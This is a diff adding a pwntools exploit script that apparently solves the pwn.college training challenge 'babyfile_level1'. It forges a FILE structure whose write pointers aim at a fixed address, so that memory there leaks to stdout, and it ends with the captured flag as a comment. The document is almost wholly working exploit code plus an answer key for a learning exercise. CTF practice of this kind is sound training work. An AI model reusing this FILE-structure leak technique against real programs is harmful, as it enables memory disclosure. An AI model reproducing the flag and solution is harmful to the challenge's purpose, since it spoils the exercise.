@@ -1,0 +1,22 @@
+from pwn import *
+
+context.arch = 'amd64'
+
+p = process("/challenge/babyfile_level1")
+
+payload = p64(0xfbad0800) # flag
+payload += p64(0) # read_ptr
+payload += p64(0x4040e0) # read_end
+payload += p64(0) # read_base
+payload += p64(0x4040e0) # write_base
+payload += p64(0x4040e0 + 100) # write_ptr
+payload += p64(0) # write_end
+payload += p64(0) # buf_base
+payload += p64(100) # buf_end
+payload += p64(0) * 5
+payload += p64(1) # fileno
+
+p.send(payload)
+
+p.interactive()
+#pwn.college{Uwdrygu9qs3dZlv2iYxYCPIyFUG.dBDN0MDL2EzNyYzW}
